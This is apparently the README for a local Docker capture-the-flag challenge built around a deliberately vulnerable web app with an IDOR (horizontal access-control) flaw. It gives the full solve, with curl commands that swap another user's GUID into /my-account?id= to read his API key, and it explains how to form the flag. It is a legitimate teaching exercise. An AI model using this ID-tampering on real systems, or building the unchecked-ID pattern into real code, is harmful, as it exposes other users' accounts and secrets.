# IITCTF — User ID Controlled by Request Parameter

A local Docker CTF challenge inspired by the PortSwigger lab:
"User ID controlled by request parameter, with unpredictable user IDs".

## Credentials

```text
username: wiener
password: peter
```

## Start

```bash
docker compose up --build
```

Open:

```text
http://127.0.0.1:8080/
```

## Intended CTF solve

### 1. Login as wiener

Use:

```text
wiener:peter
```

The application redirects you to:

```text
/my-account?id=<wiener-GUID>
```

### 2. Identify the user-controlled ID

Inspect the request in Burp Suite or the browser address bar:

```text
GET /my-account?id=<GUID>
```

The GUID is being supplied by the client.

### 3. Discover Carlos's GUID

Visit the public blog post:

```text
/post/1
```

The author link exposes Carlos's profile:

```text
/user/<Carlos-GUID>
```

### 4. Exploit the horizontal access-control flaw

Replace your ID with Carlos's GUID:

```text
/my-account?id=<Carlos-GUID>
```

The application incorrectly returns Carlos's account information.

### 5. Construct the CTF flag

Read Carlos's API key and submit:

```text
IITCTF{<Carlos_API_KEY>}
```

The API key is generated when the container starts, so the exact flag is different for each fresh container.

## Example curl workflow

First login:

```bash
curl -i -c cookies.txt -X POST \
  -d 'username=wiener&password=peter' \
  http://127.0.0.1:8080/login
```

Then inspect:

```bash
curl -s http://127.0.0.1:8080/post/1
```

Find Carlos's GUID from the author/profile link, then:

```bash
curl -s "http://127.0.0.1:8080/my-account?id=CARLOS_GUID"
```

The response contains Carlos's API key.

Submit:

```text
IITCTF{CARLOS_API_KEY}
```

## Vulnerability

This intentionally demonstrates horizontal privilege escalation / IDOR-style
broken access control. The server uses the requested `id` without checking
whether the authenticated user is authorized to access that account.

## Important

`/flag` exists only as a local organizer/convenience endpoint. Do not use it
during the intended solve; obtain Carlos's API key through the vulnerable
`/my-account?id=` functionality.
